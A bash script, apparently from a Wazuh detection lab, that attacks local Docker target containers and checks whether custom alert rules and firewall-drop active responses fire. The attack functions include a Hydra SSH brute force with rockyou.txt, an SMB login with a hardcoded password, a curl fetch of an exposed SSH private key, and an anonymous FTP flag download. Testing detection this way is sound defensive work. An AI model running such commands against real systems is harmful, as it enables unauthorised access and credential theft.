#!/bin/bash
set -e
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

FTP_IP=$(sudo docker exec target_ftp_easy hostname -I | tr -d ' ')
SAMBA_IP=$(sudo docker exec target_samba_easy hostname -I | tr -d ' ')
APACHE_IP=$(sudo docker exec target_apache_easy hostname -I | tr -d ' ')
MANAGER="single-node-wazuh.manager-1"

banner() { echo -e "\n${CYAN}============================================${NC}"; echo -e "${CYAN}  $1${NC}"; echo -e "${CYAN}============================================${NC}\n"; }

check_alert() {
    local rule_id="$1" description="$2" wait_time="${3:-10}"
    echo -e "${YELLOW}[*] Attente ${wait_time}s pour la détection Wazuh...${NC}"
    sleep "$wait_time"
    RESULT=$(sudo docker exec $MANAGER grep -c "Rule: $rule_id" /var/ossec/logs/alerts/alerts.log 2>/dev/null | tr -d "\n" || echo "0")
    if [ "$RESULT" -gt 0 ]; then
        echo -e "${GREEN}[✅] DÉTECTÉ : Règle $rule_id - $description${NC}"
        echo -e "${GREEN}[🛡️] Active Response firewall-drop déclenché !${NC}"
    else
        echo -e "${RED}[❌] NON DÉTECTÉ : Règle $rule_id - $description${NC}"
    fi
}

unblock_all() {
    echo -e "${YELLOW}[*] Déblocage de toutes les IPs...${NC}"
    for c in target_samba_easy target_apache_easy target_ftp_easy; do
        sudo docker exec $c /var/ossec/active-response/bin/firewall-drop delete - 172.19.0.1 2>/dev/null || true
    done
    echo -e "${GREEN}[✅] IPs débloquées${NC}"
}

attack_ssh() {
    banner "ATTAQUE 1 : Brute Force SSH (Règle 100037)"
    echo -e "${RED}[💀] Cible : target-samba-easy ($SAMBA_IP)${NC}"
    echo -e "${YELLOW}[*] Lancement de Hydra (20s)...${NC}"
    timeout 20 hydra -l invaliduser -P /usr/share/wordlists/rockyou.txt ssh://$SAMBA_IP -t 4 -I 2>/dev/null || true
    check_alert "100037" "SSH: Brute force attack detected (5+ attempts)" 10
}

attack_smb() {
    banner "ATTAQUE 2 : Accès fichier sensible SMB (Règle 100033)"
    echo -e "${RED}[💀] Cible : target-samba-easy ($SAMBA_IP)${NC}"
    echo -e "${YELLOW}[*] Connexion au partage SMB...${NC}"
    smbclient //$SAMBA_IP/public -U sambauser%princess1 -c "get note_service.txt" 2>/dev/null || true
    check_alert "100033" "SMB: CRITICAL - Sensitive file accessed" 10
}

attack_apache() {
    banner "ATTAQUE 3 : Vol de clé SSH via Apache (Règle 100060)"
    echo -e "${RED}[💀] Cible : target-apache-easy ($APACHE_IP)${NC}"
    echo -e "${YELLOW}[*] Téléchargement de la clé privée SSH...${NC}"
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$APACHE_IP/backup_key.pem 2>/dev/null || echo "000")
    echo -e "${RED}[💀] HTTP $HTTP_CODE - Clé SSH récupérée !${NC}"
    check_alert "100060" "CRITICAL: Apache - SSH private key accessed" 10
}

attack_ftp() {
    banner "ATTAQUE 4 : Download flag FTP anonyme (Règle 100021)"
    echo -e "${RED}[💀] Cible : target-ftp-easy ($FTP_IP)${NC}"
    echo -e "${YELLOW}[*] Connexion FTP anonyme...${NC}"
    FLAG=$(curl -s ftp://$FTP_IP/pub/flag.txt --user anonymous:anon@test.com 2>/dev/null || echo "ERREUR")
    echo -e "${RED}[💀] Flag récupéré : $FLAG${NC}"
    check_alert "100021" "FTP: CRITICAL - FLAG file downloaded" 10
}

summary() {
    banner "RÉSUMÉ DES TESTS"
    for rule in "100037:SSH Brute Force" "100033:SMB Fichier Sensible" "100060:Apache SSH Key" "100021:FTP Flag Download"; do
        ID=$(echo $rule | cut -d: -f1); DESC=$(echo $rule | cut -d: -f2)
        COUNT=$(sudo docker exec $MANAGER grep -c "Rule: $ID" /var/ossec/logs/alerts/alerts.log 2>/dev/null | tr -d "\n" || echo "0")
        if [ "$COUNT" -gt 0 ]; then echo -e "  ${GREEN}✅ Règle $ID ($DESC) - $COUNT alertes${NC}"
        else echo -e "  ${RED}❌ Règle $ID ($DESC) - Non détecté${NC}"; fi
    done
    AR_COUNT=$(sudo docker exec $MANAGER grep -c "Rule: 651" /var/ossec/logs/alerts/alerts.log 2>/dev/null | tr -d "\n" || echo "0")
    echo -e "\n  ${GREEN}🛡️ Active Responses (blocages) : $AR_COUNT déclenchements${NC}\n"
}

case "${1:-all}" in
    ssh)    unblock_all; attack_ssh; summary ;;
    smb)    unblock_all; attack_smb; summary ;;
    apache) unblock_all; attack_apache; summary ;;
    ftp)    unblock_all; attack_ftp; summary ;;
    all)
        banner "DÉMONSTRATION COMPLÈTE - ACTIVE RESPONSE EASY"
        echo -e "${CYAN}IPs : FTP=$FTP_IP | Samba=$SAMBA_IP | Apache=$APACHE_IP${NC}"
        read -p "Appuyez sur Entrée pour lancer les attaques..."
        unblock_all; attack_ssh; unblock_all; attack_smb
        unblock_all; attack_apache; unblock_all; attack_ftp; summary ;;
    *) echo "Usage: $0 [all|ssh|smb|apache|ftp]"; exit 1 ;;
esac
